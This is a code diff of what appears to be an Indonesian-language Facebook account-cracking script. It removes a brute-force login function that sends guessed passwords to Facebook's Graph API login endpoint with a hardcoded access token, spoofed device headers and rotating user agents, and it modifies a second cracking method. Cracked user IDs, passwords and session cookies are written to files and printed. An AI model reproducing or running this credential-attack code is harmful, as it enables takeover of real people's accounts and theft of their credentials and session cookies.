@@ -1078,7 +1078,7 @@ def passwrd():
                     for xpwd in pwnya:
                         pwv.append(xpwd)
                 else:pass
-                pool.submit(reguler,idf,pwv)
+                pool.submit(regulerr,idf,pwv,awal)
                 
         print('')
     Console().print(Panel(f'[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan',subtitle="╭───", subtitle_align="left",title=f"[bold green]Cek Opsi",width=80,style=f"{color_panel}"))
@@ -1092,84 +1092,12 @@ def passwrd():
         time.sleep(1)
         exit()
 
-#--------------------[ METODE-MOBILE ]-----------------#
-    
-def api(idf,pwv):
-    global loop,ok,cp
-    rr = random.randint
-    prog.update(des,description=f" {K2}•{H2} API  {SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-    prog.advance(des)
-    rudalll = [f'Mozilla/5.0 (Linux; Android {str(rr(1,14))}; SM-G780G Build/SP1A.210812.016; wv)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(77,150))}.0{str(rr(4000,4280))}.{str(rr(70,199))} Mobile Safari/537.36[FB_IAB/FB4A; FBAV/397.0.0.23.404;']
-    ses = requests.Session()
-    try:
-        if 'ya' in ualuh: ua = ualu[0]
-        for pw in pwv:
-            pw = pw.lower()
-            pw = pw.lower()
-            ua = random.choice(ugent)
-            ua = random.choice(free)
-            params = {
-					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
-					"sdk_version": {random.randint(1,26)}, 
-					"email": idf,
-					"locale": "en_US",
-					"password": pw,
-					"sdk": "android",
-					"generate_session_cookies": "1",
-					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
-				}
-            headers = {
-					"Host": "graph.facebook.com",
-					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
-					"x-fb-sim-hni": str(random.randint(20000, 40000)),
-					"x-fb-net-hni": str(random.randint(20000, 40000)),
-					"x-fb-connection-quality": "EXCELLENT",
-					"user-agent": ua,
-					"content-type": "application/x-www-form-urlencoded",
-					"x-fb-http-engine": "Liger"
-				}
-            post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
-            if "session_key" in post.text and "EAA" in post.text:
-                coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
-                user = re.findall("c_user=(\d+)",coki)[0]
-                if user in ok or user in cp:
-                    break
-                else:
-                    ok.append(user)
-                    tree = Tree(" ",guide_style=f"{color_ok}")
-                    tree.add(Panel(f"{H2}       Succes-Login{P2}",width=30,padding=(0,2),style=f"{color_ok}"))
-                    tree.add(f"\r{P2}User ID {P2}  : {H2}{user}")
-                    tree.add(f"{P2}Password {P2} : {H2}{pw}")
-                    tree.add(Panel(f"{H2}{coki}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
-                    tree.add(Panel(f"{H2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
-                    prints(tree)
-                    open(f"OK/{hari_ini}.txt","a").write(f"{user}|{pw}|{coki}\n")
-                    break
-            elif "User must verify their account" in post.text:
-                user = post.json()["error"]["error_data"]["uid"]
-                if user in ok or user in cp:
-                    break
-                else:
-                    cp.append(user)
-                    tree = Tree(" ",guide_style=f"{color_cp}")
-                    tree.add(Panel(f"{K2}   Checkpoint-Login{P2}",width=30,padding=(0,2),style=f"{color_cp}"))
-                    tree.add(f"\r{P2}User ID {P2}     : {K2}{user}")
-                    tree.add(f"{P2}Password {P2}    : {K2}{pw}")
-                    tree.add(Panel(f"{K2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_cp}"))
-                    prints(tree)
-                    open(f"CP/{hari_ini}.txt","a").write(f"{user}|{pw}\n")
-                    break
-            elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
-                prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(loop)}/{len(id)} OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}")
-                prog.advance(des)
-                time.sleep(30)
-            else:continue
-    except requests.exceptions.ConnectionError:time.sleep(31)
-loop+=1
 #--------------------[ METODE reguler ]-----------------#
-def reguler(idf,pwv):
+def regulerr(idf,pwv,awal):
 	global loop,ok,cp
 	rr = random.randint
+	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
+	ahir = str(datetime.now()-awal).split('.')[0]
 	prog.update(des,description=f"{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
 	ua = random.choice(free)
@@ -1209,25 +1137,25 @@ def reguler(idf,pwv):
 				prints(tree)
 				os.popen('play-audio c.mp3')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				
+				ceker(idf,pw)
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-				tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
 				tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
 				tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
 				prints(tree)
 				os.popen('play-audio o.mp3')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
-				
+				cek_apk(kuki)
 				break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
 	loop+=1
-    
+
 #-----------------------[ CEK APLIKASI ]--------------------#
 def cek_apk(kuki):
 	session = requests.Session()
